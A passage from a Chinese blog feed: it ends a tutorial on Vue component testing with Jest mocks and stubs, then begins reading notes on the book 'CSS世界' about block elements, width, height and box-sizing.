Util Test"></a>4.组件测试: Vue Util Test</h3><p>文章开头说到：“把用户的点击行为作为输入，把组件渲染出来的HTML作为输出，是可以验证前端代码的正确性的。”</p><p>如何模拟输入？如何获取输出？</p><p>测试 UI 组件大多需要将它们挂载到 <code>DOM</code> (虚拟或真实) 上，才能完全断言它们是否正常工作。这里我们要用到 <code>Vue Test Utils</code>。它是 Vue 官方的偏底层的组件测试库，它允许在node进程里挂载 Vue 组件，模拟输入（用户点击， <code>prop</code>和注入），获取输出（当前组件渲染出来的HTML）。</p><p>你可以通过 <code>mount</code> 方法挂载组件，被挂载的组件会返回一个包裹器 <code>wrapper</code>。<code>wrapper</code>会暴露一系列 API，用于模拟用户点击行为，获取组件渲染出来的HTML。</p><p><code>Vue Utils Test</code>提供的API示例如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import &#123; mount &#125; from &apos;@vue/test-utils&apos;</span><br><span class="line">import Login from &apos;./Login.vue&apos;</span><br><span class="line"></span><br><span class="line">// 挂载组件，得到Login组件的包裹器 wrapper</span><br><span class="line">const wrapper = mount(Login)</span><br><span class="line"></span><br><span class="line">// 模拟用户交互</span><br><span class="line">wrapper.find(&apos;.button&apos;).trigger(&apos;click&apos;)</span><br><span class="line"></span><br><span class="line">// 获取组件渲染出来的HTML</span><br><span class="line">wrapper.html()</span><br><span class="line">wrapper.text()</span><br><span class="line"></span><br><span class="line">// nextTick</span><br><span class="line">await Vue.nextTick()</span><br></pre></td></tr></table></figure></p><p>运行环境准备好了，可以挂载Vue组件，可以模拟点击，可以获取组件渲染出来的HTML。</p><p>终于我们要写测试用例了!</p><p><br></p><h3 id="5-编写测试用例"><a href="#5-编写测试用例" class="headerlink" title="5.编写测试用例"></a>5.编写测试用例</h3><p>测试用例，也称为驱动代码，用来调用被测代码，它是一个 输入数据 和 预计输出 的集合。</p><p>输入：</p><ul><li>用户的点击行为、键盘操作</li><li>服务端返回的数据</li><li>需要判断的全局变量</li></ul><p>输出：</p><ul><li>页面显示</li><li>调用的JSAPI</li><li>调用参数</li></ul><p>可以看到这个测试用例包含了这些要素<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; mount &#125; <span class="keyword">from</span> <span class="string">'@vue/test-utils'</span></span><br><span class="line"><span class="keyword">import</span> api <span class="keyword">from</span> <span class="string">'@src/api.js'</span></span><br><span class="line"><span class="keyword">import</span> Login <span class="keyword">from</span> <span class="string">'../src/Login.vue'</span></span><br><span class="line"></span><br><span class="line">describe(<span class="string">'登录组件'</span>, () =&gt;&#123;</span><br><span class="line">  <span class="comment">// 挂载要测试的组件</span></span><br><span class="line">  <span class="keyword">const</span> wrapper = mount(Login)</span><br><span class="line"></span><br><span class="line">  it(<span class="string">'点击登陆按钮'</span>, <span class="keyword">async</span>() =&gt; &#123;</span><br><span class="line">    <span class="comment">// 【输入】提前定义服务端返回内容</span></span><br><span class="line">    jest</span><br><span class="line">        .spyOn(api, <span class="string">'login'</span>)</span><br><span class="line">        .mockImplementation(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(&#123; <span class="attr">status</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【输入】模拟用户点击</span></span><br><span class="line">    <span class="keyword">await</span> wrapper.find(<span class="string">'.button'</span>).trigger(<span class="string">'click'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【输出】检查调用API,调用参数是否正确</span></span><br><span class="line">    expect(api.login.mock.calls[<span class="number">0</span>][<span class="number">0</span>]).toEqual(&#123;</span><br><span class="line">        userName: <span class="string">'Mike'</span>,</span><br><span class="line">        passwork: <span class="string">'123456'</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 【输出】检查页面是否正常显示</span></span><br><span class="line">    expect(wrapper.text()).toBe(<span class="string">'登录成功'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-实现Mock"><a href="#6-实现Mock" class="headerlink" title="6.实现Mock"></a>6.实现Mock</h3><p>除了检查页面内容是否正确，服务端请求有没有发出去，发出去的参数是怎样的，也是一个很重要的检查内容。要想拿到这写输出数据，需要用到Mock。Mock的三个特性，能帮助我们完成这项检查</p><ul><li>擦除函数的实际实现</li><li>设置函数返回值</li><li>捕获函数调用情况</li></ul><p><br></p><h4 id="6-1-jest-fn"><a href="#6-1-jest-fn" class="headerlink" title="6.1 jest.fn"></a>6.1 jest.fn</h4><p>为了捕获函数的调用情况，我们要用到<code>jest.fn</code>，它是一个高阶函数，它接收一个函数，并记录这个函数被调用时的参数,  this，函数返回值，并返回这个函数。</p><p>我们用 <code>jest.fn</code>包裹函数 <code>add</code>，一旦 <code>add</code>被调用，访问 <code>add.mock可以得到</code>该函数的调用情况，从而实现断言。</p><p>我们实现一个 jest.fn , 执行<code>node index.js</code> 来看看函数调用情况是怎样被记录的。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现一个jest.fn</span></span><br><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">const</span> jest = &#123;</span><br><span class="line">  fn: <span class="function"><span class="params">impl</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> mockFn = <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">      <span class="comment">// Store the arguments used</span></span><br><span class="line">      mockFn.mock.calls.push(args);</span><br><span class="line">      mockFn.mock.instances.push(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> value = impl.apply(<span class="keyword">this</span>, args); <span class="comment">// call impl, passing the right this</span></span><br><span class="line">        mockFn.mock.results.push(&#123; <span class="attr">type</span>: <span class="string">'return'</span>, value &#125;);</span><br><span class="line">        <span class="keyword">return</span> value; <span class="comment">// return the value</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (value) &#123;</span><br><span class="line">        mockFn.mock.results.push(&#123; <span class="attr">type</span>: <span class="string">'throw'</span>, value &#125;);</span><br><span class="line">        <span class="keyword">throw</span> value; <span class="comment">// re-throw the error</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mockFn.mock = &#123;</span><br><span class="line">      calls: [],</span><br><span class="line">      instances: [],</span><br><span class="line">      results: []</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加个mockImplementation方法</span></span><br><span class="line">    <span class="keyword">return</span> mockFn</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用jest.fn包裹add函数</span></span><br><span class="line"><span class="keyword">const</span> add = jest.fn(<span class="function">(<span class="params">x, y</span>) =&gt;</span> x + y)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用add时，add.mock会记录调用时的参数，this值，返回值</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">console</span>.log(add.mock)</span><br><span class="line"><span class="comment">// &#123; calls: [[2, 2]], instances: [Window], results: [&#123; type: 'return', value: 4&#125;] &#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-2-jest-spyOn"><a href="#6-2-jest-spyOn" class="headerlink" title="6.2 jest.spyOn"></a>6.2 jest.spyOn</h4><p>可是实际中，<code>jest.fn</code>并不常用。我们想监听的是写在项目里的方法的调用情况。</p><p>这时，我们需要用 <code>jest.spyOn</code>，<code>jest.spyOn(object, methodName)</code> 给现有对象里的函数添加 mock，当对象里的函数被调用时，访问 <code>object[methodName].mock</code> 可以获取该函数的调用情况。</p><p>实现jest.spyOn，要跟着一起敲，敲完就懂了<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">jest.spyOn = <span class="function">(<span class="params">obj, prop</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 保留原始的obj[prop]</span></span><br><span class="line">  <span class="keyword">const</span> originFunc = obj[prop]</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 给obj[prop]方法包裹一层jest.fn，并赋值替换</span></span><br><span class="line">  obj[prop] = jest.fn(obj[prop])</span><br><span class="line"></span><br><span class="line">  <span class="comment">// mockRestore: 提供复原obj[prop]的方法</span></span><br><span class="line">  obj[prop].mockRestore = <span class="function"><span class="params">()</span> =&gt;</span> (obj[prop] = originFunc)</span><br><span class="line">  <span class="keyword">return</span> obj[prop]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> api = &#123;</span><br><span class="line">  add: <span class="function">(<span class="params">x, y</span>) =&gt;</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jest.spyOn(api, <span class="string">'add'</span>)</span><br><span class="line">api.add(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">console</span>.log(api.add.mock)</span><br><span class="line"><span class="comment">// &#123; calls: [[2, 2]], instances: [Window], results: [&#123; type: 'return', value: 4&#125;] &#125;</span></span><br></pre></td></tr></table></figure></p><p>有了这个方法，我们要mock项目代码里的方法，就可以这样写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> api <span class="keyword">from</span> <span class="string">'@src/api'</span>jest.spyOn(api, <span class="string">'login'</span>)</span><br></pre></td></tr></table></figure><p>单测执行时，任意一个地方调用了api.login，它的调用情况就会被记录下来。</p><p><br></p><h4 id="6-3-jest-fn-mockImplementation"><a href="#6-3-jest-fn-mockImplementation" class="headerlink" title="6.3 jest.fn.mockImplementation"></a>6.3 jest.fn.mockImplementation</h4><p>除了监听函数的调用情况，很多时候，我们还希望可以直接指定函数的返回值。</p><p>这个时候，就要用到 <code>mockImplementation</code>。 我们需要改写一下前面定义的 jest.fn，给要返回出去的高阶函数，加上<code>mockImplementation</code> 方法，用于改变原函数的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加个mockImplementation方法mockFn.mockImplementation = newImpl =&gt; (impl = newImpl)</span></span><br></pre></td></tr></table></figure><p><code>jest.fn.mockImplementation</code> 完整代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jest = &#123;</span><br><span class="line">    fn: <span class="function"><span class="params">impl</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> mockFn = <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// Store the arguments used</span></span><br><span class="line">            mockFn.mock.calls.push(args);</span><br><span class="line">            mockFn.mock.instances.push(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> value = impl.apply(<span class="keyword">this</span>, args); <span class="comment">// call impl, passing the right this</span></span><br><span class="line">                mockFn.mock.results.push(&#123; <span class="attr">type</span>: <span class="string">'return'</span>, value &#125;);</span><br><span class="line">                <span class="keyword">return</span> value; <span class="comment">// return the value</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (value) &#123;</span><br><span class="line">                mockFn.mock.results.push(&#123; <span class="attr">type</span>: <span class="string">'throw'</span>, value &#125;);</span><br><span class="line">                <span class="keyword">throw</span> value; <span class="comment">// re-throw the error</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mockFn.mock = &#123;</span><br><span class="line">            calls: [],</span><br><span class="line">            instances: [],</span><br><span class="line">            results: []</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加个mockImplementation方法</span></span><br><span class="line">        mockFn.mockImplementation = <span class="function"><span class="params">newImpl</span> =&gt;</span> (impl = newImpl)</span><br><span class="line">        <span class="keyword">return</span> mockFn</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jest.spyOn = <span class="function">(<span class="params">obj, prop</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 保留原始的obj[prop]</span></span><br><span class="line">    <span class="keyword">const</span> originFunc = obj[prop]</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 给obj[prop]方法包裹一层jest.fn，并赋值替换</span></span><br><span class="line">    obj[prop] = jest.fn(obj[prop])</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mockRestore: 提供复原obj[prop]的方法</span></span><br><span class="line">    obj[prop].mockRestore = <span class="function"><span class="params">()</span> =&gt;</span> (obj[prop] = originFunc)</span><br><span class="line">    <span class="keyword">return</span> obj[prop]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> api = &#123;</span><br><span class="line">    add: <span class="function">(<span class="params">x, y</span>) =&gt;</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jest.spyOn(api, <span class="string">'add'</span>).mockImplementation(<span class="function"><span class="params">()</span> =&gt;</span> <span class="number">100</span>)</span><br><span class="line">api.add(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">console</span>.log(api.add.mock)</span><br><span class="line"><span class="comment">// 可以看到api.add()返回的值总是100</span></span><br><span class="line"><span class="comment">// &#123; calls: [[2, 2]], instances: [Window], results: [&#123; type: 'return', value: 100&#125;] &#125;</span></span><br></pre></td></tr></table></figure><p>到这里，几乎所有我们想要的输入输出都拿到了，单测也跑起来了</p><p><br></p><h3 id="7-配置Stub"><a href="#7-配置Stub" class="headerlink" title="7. 配置Stub"></a>7. 配置Stub</h3><p>但还有一个问题，单测往往会跑到一些外部函数。而这个外部函数，在单元测试执行环境里未被实现，且是我们不感兴趣的代码，为了不影响自身逻辑的测试，我们可以用一个假的函数来代替真实的函数A，这就是stub。</p><p>一个 stub 就是简单的一段替身代码。stub在屏蔽与当前单元测试无关行为方面很有用，起到了隔离和补齐的作用，使被测代码能够独立编译、运行。</p><p>常见需要被stub的代码：</p><ul><li>HTTP请求返回值</li><li>css文件、图片、字体文件</li><li>JSDom没有提供的浏览器API，如Worker, Canvas</li><li>其他可以忽略掉的组件，方法等等</li></ul><p>实际项目中，可以通过配置 jest.config.js 中的 <code>moduleNameMapper</code>属性来指定你要 stub 的代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jest.config.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    moduleNameMapper: &#123;</span><br><span class="line">        <span class="string">'\\.(css|less|sass|scss|jpg|jpeg|png|gif|eot|otf|webp|svg|ttf|woff|woff2|mp4|webm|wav|mp3|m4a|aac|oga)$'</span>: <span class="string">'&lt;rootDir&gt;/file-mock.js'</span>,</span><br><span class="line">        <span class="string">'@src/api'</span>: <span class="string">'&lt;rootDir&gt;/api-mock.js'</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// file-mock.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="string">'file-stub'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// api-mock.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    getUserInfo: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(&#123;</span><br><span class="line">            username: <span class="string">'Mike'</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>End.</p>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>《CSS世界》笔记</title>
      <link href="/2022/02/12/CSS%E4%B8%96%E7%95%8C/"/>
      <url>/2022/02/12/CSS%E4%B8%96%E7%95%8C/</url>
      <content type="html"><![CDATA[<h1 id="第三章-流、元素与基本内尺寸"><a href="#第三章-流、元素与基本内尺寸" class="headerlink" title="第三章 流、元素与基本内尺寸"></a>第三章 流、元素与基本内尺寸</h1><h2 id="块级元素"><a href="#块级元素" class="headerlink" title="块级元素"></a>块级元素</h2><p>块级元素和display:block 的元素”不是一个概念。<br><code>&lt;li&gt;</code>的 display值是list-item<br><code>&lt;table&gt;</code>默认的 display 值是 table<br>但是它们都是块级元素，都符合块级元素的特征，也就是一个水平流上只能单独显示一个元素，多个块级元素则换行显示。</p><h2 id="inline-block"><a href="#inline-block" class="headerlink" title="inline-block"></a>inline-block</h2><p>每个元素有两个盒子，外在盒子和内在盒子。<br><strong>外在盒子</strong>负责元素是可以一行显示，还是只能换行显示；<br><strong>内在盒子</strong>负责宽高、内容呈现什么的，也叫容器盒子。</p><p>block: block-block<br>table: block-table<br>inline-block: inline-block，既能和图文一行显示，又能直接设置width/height。</p><h2 id="外部尺寸width-auto"><a href="#外部尺寸width-auto" class="headerlink" title="外部尺寸width:auto"></a>外部尺寸width:auto</h2><p>盒子分内在盒子和外在盒子，同样地，尺寸也分<strong>内在尺寸</strong>和<strong>外在尺寸</strong>。内在尺寸由内部元素决定，外部尺寸由元素width属性决定。</p><p>width的默认值是auto，指的是外在尺寸。<br>width: auto会有怎样的表现？</p><ul><li>充分利用可用空间，<code>&lt;div&gt;`</code><p>`这些元素的宽度都会默认100%于父级容器。</p></li></ul><h3 id="因此很多时候其实不用设置width-100"><a href="#因此很多时候其实不用设置width-100" class="headerlink" title="因此很多时候其实不用设置width: 100%"></a>因此很多时候其实不用设置width: 100%</h3><p>块级元素一旦设置了宽度，margin/border/padding/content自动分配水平空间的流动性就丢失了。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* good */</span></span><br><span class="line"><span class="selector-class">.nav</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">10px</span>; </span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">9px</span> <span class="number">10px</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bad*/</span></span><br><span class="line"><span class="selector-class">.nav</span> &#123; </span><br><span class="line"> <span class="attribute">width</span>: <span class="number">240px</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-class">.nav</span> <span class="selector-tag">a</span> &#123; </span><br><span class="line"> <span class="attribute">display</span>: block; </span><br><span class="line"> <span class="attribute">width</span>: <span class="number">200px</span>; </span><br><span class="line"> <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">10px</span>; </span><br><span class="line"> <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">10px</span>; </span><br><span class="line"> ... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>除非有明确的设置，元素都不会主动超过父级容器宽度的。如：width设置，内部连续很长的英文数字，内联元素被设置为<code>white-space:nowrap</code></li></ul><h2 id="内部尺寸的3种表现形式"><a href="#内部尺寸的3种表现形式" class="headerlink" title="内部尺寸的3种表现形式"></a>内部尺寸的3种表现形式</h2><h3 id="1-包裹性"><a href="#1-包裹性" class="headerlink" title="1. 包裹性"></a>1. 包裹性</h3><p>按钮文字越多，<code>.content元素</code>宽度越宽（内部尺寸特性）。但如果文字足够多，则会在容器最大宽度处自动换行。<br><a href="http://demo.cssworld.cn/3/2-5.php" target="_blank" rel="noopener">http://demo.cssworld.cn/3/2-5.php</a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="undefined">  text-align: center;</span></span><br><span class="line"><span class="undefined">  width: 240px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="undefined">  display: inline-block;</span></span><br><span class="line"><span class="undefined">  text-align: left;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="2-首选最小宽度"><a href="#2-首选最小宽度" class="headerlink" title="2. 首选最小宽度"></a>2. 首选最小宽度</h3><p>Q：假设.box的width: 0， .content的宽度会是0吗？可以看到字体吗？<br>A：宽度不会为0，可以看到字体，此时.content的宽度为“首选最小宽度”。汉字最小宽度 or 连续的英文字符单元。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="undefined">  width: 0</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>文字内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="box-sizing"><a href="#box-sizing" class="headerlink" title="box-sizing"></a>box-sizing</h2><p>content box, padding box(仅fireFox曾经支持), border box, margin box(不支持)<br>width和height作用于哪个盒子上。</p><h3 id="如何评价-box-sizing-border-box"><a href="#如何评价-box-sizing-border-box" class="headerlink" title="如何评价* { box-sizing: border-box }?"></a>如何评价* { box-sizing: border-box }?</h3><ul><li>通配符*产生了没必要的消耗。</li><li>border-box不能解决所有问题，推荐宽度分离，外面嵌套<div>，模拟border和padding</div></li><li>上面宽度分离的方法有局限性，如无法focus input, textarea的边框，这个时候只能使用border-box，下面的css重置更加合理。<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span>, <span class="selector-tag">textarea</span>, <span class="selector-tag">img</span>, <span class="selector-tag">video</span>, <span class="selector-tag">object</span> &#123; </span><br><span class="line"> <span class="attribute">box-sizing</span>: border-box; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="height-auto"><a href="#height-auto" class="headerlink" title="height: auto"></a>height: auto</h2><p>某小白想要在页面插入一个div，然后满屏显示背景图，写下了如下CSS，但他会发现这个div的高度永远是0。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>; <span class="comment">/* 这是多余的 */</span></span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>; <span class="comment">/* 这是无效的 */</span></span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'bg.jpg'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>父级没有具体高度值的时候，<code>height: auto</code>会无效。如何让元素显示<code>height: 100%</code>的效果——使用显示的高度值，或可生效的百分比高度，或者使用绝对定位<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">html</span>, <span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">position</span>: 